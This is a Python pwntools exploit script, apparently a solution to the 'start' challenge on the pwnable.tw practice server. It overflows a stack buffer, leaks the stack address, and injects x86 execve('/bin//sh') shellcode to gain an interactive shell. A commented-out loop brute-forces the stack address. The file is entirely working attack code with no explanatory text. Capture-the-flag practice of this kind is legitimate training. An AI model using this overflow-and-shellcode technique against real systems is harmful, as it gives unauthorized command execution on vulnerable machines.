from pwn import *

# elf = ELF('./start')
# io = process(elf.path)
io = remote('chall.pwnable.tw', 10000)
print(io.recv())

payload = b'A'*20 + p32(0x08048087)
io.send(payload)
esp = u32(io.recv()[:4])
print('esp:', hex(esp))

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
payload = b'A'*20 + p32(esp+20) + shellcode

io.send(payload)
io.interactive()



# esp = 0xffffd25c
# shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
# while True:
#     # elf = ELF('./start')
#     # io = process(elf.path)
#     io = remote('chall.pwnable.tw', 10000)
#     io.recvuntil(b'CTF:')

#     print('trying esp:', hex(esp))
#     payload = b'A'*20 + p32(esp) + shellcode
#     io.send(payload)
#     try:
#         io.sendline(b'id')
#         print(io.recv())
#         # io.interactive()
#         break
#     except Exception as e:
#         io.close()
#         esp += 4